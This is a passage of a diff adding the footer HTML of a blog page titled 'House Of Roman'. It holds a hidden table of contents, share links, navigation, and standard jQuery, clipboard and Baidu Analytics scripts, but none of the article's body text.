+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#demo%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">demo分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-number">1.5.</span> <span class="toc-text">5.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-number">1.6.</span> <span class="toc-text">6.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7"><span class="toc-number">1.7.</span> <span class="toc-text">7.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/06/House-Of-Roman/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&text=House Of Roman"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&is_video=false&description=House Of Roman"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House Of Roman&body=Check out this article: https://grxer.gitee.io/2023/08/06/House-Of-Roman/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&name=House Of Roman&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&t=House Of Roman"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
